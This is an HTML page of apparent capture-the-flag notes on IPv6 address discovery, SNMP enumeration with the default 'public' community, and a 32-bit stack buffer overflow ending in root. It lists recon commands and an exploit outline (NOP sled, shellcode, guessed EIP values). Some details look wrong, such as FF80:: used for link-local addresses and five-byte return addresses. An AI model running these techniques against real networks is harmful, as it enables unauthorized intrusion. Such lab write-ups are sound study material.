@@ -1,0 +1,123 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Sneaky - IPv6 SNMP Buffer Overflow</title>
+</head><body>IPv6: Special addresses<br/>
+fe80::/10&#09;&#09;Unique Link Local is NOT Loopback (similar to 169.254.x.x link local on IPv4 when you can't get an IP). Link local is routable from LOCAL subnet<br/>
+<br/>
+fc00::/7&#09;&#09;Unique Local-Unicast (similar to subnets 10.x.x.x 172.16.x.x, 192.168.x.x)<br/>
+<br/>
+2000::/3&#09;&#09;Global Unicast<br/>
+<br/>
+Subnetting /# is that many bits are 1s, followed by 0s<br/>
+fe80::/10 translates to this mask: 1111 1111 1100 0000 0000 0000 0000 0000<br/>
+fe80:0000:0000:0000:0000:0000:0000:0000<br/>
+1111:1111:1100:0000:0000:0000:0000:0000<br/>
+febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff<br/>
+<br/>
+<br/>
+fc00::/7 translates to this mask: 1111111000000000000000000000<br/>
+fc00:0000:0000:0000:0000:0000:0000:0000<br/>
+1111:1110:0000:0000:0000:0000:0000:0000<br/>
+fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff<br/>
+<br/>
+2000::/3<br/>
+1110:<br/>
+3fff:ffff:ffff:ffff:ffff:ffff:ffff:ffff<br/>
+<br/>
+<br/>
+Other unique addresses to be aware of:<br/>
+FF02::1&#09;&#09;Multicast all nodes<br/>
+FF0d::2&#09;&#09;Multicast ROUTER nodes<br/>
+<br/>
+<br/>
+so dead:beef:: is really an invalid address, but it is still routable in a private network!<br/>
+if something is blocked or listening on IPv4, it may also be blocked or listening on IPv6. Network misconfigurations!<br/>
+<br/>
+In Linux, IPv6 Link Local address is calculated with the help of the machine MAC address<br/>
+Windows adds some special sauce and doesn't always conform<br/>
+<br/>
+Example: <br/>
+MAC: 00:50:56:AA:8A:25<br/>
+IPv6: FE80::250:56FF:FEAA:8A25<br/>
+Invert the 7th bit of the MAC and add FFFE halfway through MAC<br/>
+&nbsp;0000 0050 56AA 8A25<br/>
+&nbsp;0000 0010 56FF FE<br/>
+FE80::0250:56FF:FEAA:8A25<br/>
+<br/>
+Another example:<br/>
+MAC: 00:50:56:AA:41:46&#09;&#09;&#09;(grab MAC from IPv4 arp table or other recon)<br/>
+IPv6: FF80::0250:56FF:FEAA:4146<br/>
+<br/>
+Now see if you can ping6 the IPv6 address<br/>
+# ping6 FF80::0250:56FF:FEAA:4146\ens34&#09;&#09;(need to specify the interface)<br/>
+<br/>
+and do other stuff with IPv6 specifically!<br/>
+ssh -6 -i key &lt;user&gt;@&lt;IPv6 Address&gt;<br/>
+ssh -i key &lt;user&gt;@FF80::0250:56FF:FEAA:4146\ens34<br/>
+<br/>
+Now you can grab IPv6 public routable address and access from other subnets!<br/>
+<br/>
+ip -6 neigh&#09;&#09;&#09;#will give the ipv6 equivalent of arp table<br/>
+ping6 -I ens34 ff02::1&#09;#ping multicast all nodes<br/>
+&nbsp;&#09;Followed by<br/>
+ip -6 neigh<br/>
+Will show all other responses from IPv6 multicast (all other machines responding to Link Local multicast)<br/>
+<br/>
+Another way is to ping6 the routeable IPv6 address<br/>
+ping6 -I dead:beef::250:56ff:feaa:8a25 ff02::1<br/>
+<br/>
+<br/>
+Now: Windows specific<br/>
+Trick: send an invalid ping packet. This will cause Windows to respond "hey, you sent the wrong ping packet"<br/>
+<br/>
+The Hackers Choice (THC) tool, alive6 (THC-IPv6 Attack Tool)<br/>
+alive6 ens34 -e ff02::1&#09;&#09;(-e is erroneous ping packet, -p is normal ping packet)<br/>
+<br/>
+Windows boxes should respond with [ICMP parameter problem]<br/>
+<br/>
+Turn this into a list of attackable IPv6 addresses:<br/>
+ip -6 neigh | awk '{print $1}' &gt; ipv6.list<br/>
+nmap -6 -p 22,445,3389,443 -iL ipv6.list<br/>
+<br/>
+Some tools require the -6 flag (or similar). Some will be able to automatically figure it out<br/>
+<br/>
+Another Tip: if you have an .rpm package (like nmap for example) and you want to install it on a debian box, you can run alien to give you a .deb package<br/>
+# alien nmap.rpm<br/>
+# dpkg -i nmap.deb<br/>
+<br/>
+<br/>
+snmpwalk -v2c -c public &lt;ip_address&gt;<br/>
+1.3.6.1.2.1.4.34.1.3 &#09;#ip information<br/>
+<br/>
+Reading SNMP is hard though, so lets get easy mode:<br/>
+apt install snmp-mibs-downloader<br/>
+<br/>
+now edit snmp.conf<br/>
+nano /etc/snmp/snmp.conf<br/>
+#comment out section<br/>
+<br/>
+now SNMPWalk will convert numbers to mibs/human readable format<br/>
+<br/>
+Enyx an ipv6 lookup tool if snmp is enabled<br/>
+<br/>
+python enyx.py 2c public &lt;ip_address&gt;<br/>
+This will pull out only IPv6 information from snmp it looks like<br/>
+NOT COMPATIBLE WITH MIBS, it is only looking for the snmp decimal string<br/>
+<br/>
+checksec &lt;binary&gt; to see protections<br/>
+Chal has no NX and no ASLR, but it is 32bit<br/>
+<br/>
+exploit = NOP &nbsp;+ SHELL + EIP<br/>
+gdb&gt; r $(python -c 'print "A"*400')<br/>
+gdb&gt; x/100x $esp&#09;&#09;&#09;&#09;#examine 100 bytes in hex at $esp<br/>
+<br/>
+without struct, have to convert to little endian<br/>
+<br/>
+EIP = "\xc0\xf4\xff\xff\xbf"<br/>
+looks like nop sled got chunked, so new address to try:<br/>
+EIP = "\x50\xf7\xff\xff\xbf"<br/>
+<br/>
+and root!<br/>
+</body></html>
